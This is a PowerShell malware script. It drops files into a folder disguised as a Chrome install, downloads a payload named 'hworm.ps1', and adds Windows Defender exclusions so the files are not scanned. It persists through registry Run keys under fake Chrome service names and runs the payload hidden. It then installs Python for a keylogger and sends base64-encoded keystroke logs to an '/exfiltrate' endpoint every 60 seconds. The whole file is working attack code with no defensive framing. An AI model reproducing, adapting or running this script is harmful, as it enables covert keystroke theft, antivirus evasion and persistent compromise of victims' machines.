mkdir "C:\Program Files\chrome_browser"
Copy-Item -Path "C:\Windows\Temp\chrome_update.ps1" -Destination "C:\Program Files\chrome_browser\chrome_update.ps1" -ItemType File -Force
Invoke-WebRequest -Uri "http://localhost:8080/hworm.ps1" -OutFile "C:\Program Files\chrome_browser\hworm.ps1"

Add-MpPreference -ExclusionPath "C:\Program Files\chrome_browser\chrome_update.ps1"
Add-MpPreference -ExclusionPath "C:\Program Files\chrome_browser\hworm.ps1"
Add-MpPreference -ExclusionProcess "C:\Program Files\chrome_browser\chrome_update.ps1"
Add-MpPreference -ExclusionProcess "C:\Program Files\chrome_browser\hworm.ps1"

New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "gchrome_service.exe" -Value "C:\Program Files\chrome_browser\hworm.ps1" -PropertyType String -Force
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "gchrome_update_service.exe" -Value "C:\Program Files\chrome_browser\chrome_update.ps1" -PropertyType String -Force

Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Program Files\chrome_browser\hworm.ps1" -NoNewWindow

# Install Python 3.11.0
Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe" -OutFile "C:\temp\python-3.11.0-amd64.exe"
Start-Process -FilePath "C:\temp\python-3.11.0-amd64.exe" `
    -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 TargetDir=""C:\Program Files\chrome_browser""" `
    -Wait -NoNewWindow;
Remove-Item -Path "C:\temp\python-3.11.0-amd64.exe" -Force

# Run keylogger and exfiltrate data every 60 seconds
Start-Process -FilePath "C:\Program Files\chrome_browser\python.exe" -ArgumentList "C:\Program Files\chrome_browser\chrome_service.py" -NoNewWindow
while ($true) {
    $Data = Get-Content -Path "C:\Windows\Temp\keylog.txt" -Raw

    # Remove newlines and extra spaces, then join into words
    $Words = ($Data -replace "`r`n|`n|`r", " ") -replace "\s+", " "

    $EncodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Words))
    Invoke-WebRequest -Uri "http://localhost:8080/exfiltrate" -UseBasicParsing -Method POST -Body ($EncodedData) -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 60
}